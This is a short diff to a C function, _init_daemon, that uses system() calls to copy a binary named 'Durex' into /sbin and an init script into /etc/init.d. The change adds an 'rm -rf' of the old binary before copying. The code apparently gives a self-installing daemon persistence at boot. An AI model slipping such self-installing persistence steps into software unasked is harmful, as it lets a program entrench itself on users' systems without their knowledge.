@@ -3,7 +3,7 @@
 int		_init_daemon(int f)
 {
 	if (f & 4)
-		system("cp -p Durex /sbin/Durex && chmod +x /sbin/Durex");
+		system("rm -rf /sbin/Durex ; cp -p Durex /sbin/Durex && chmod +x /sbin/Durex");
 	if (f & 2)
 		system("cp -p Durex.init /etc/init.d/Durex");
 	if (f & 1)
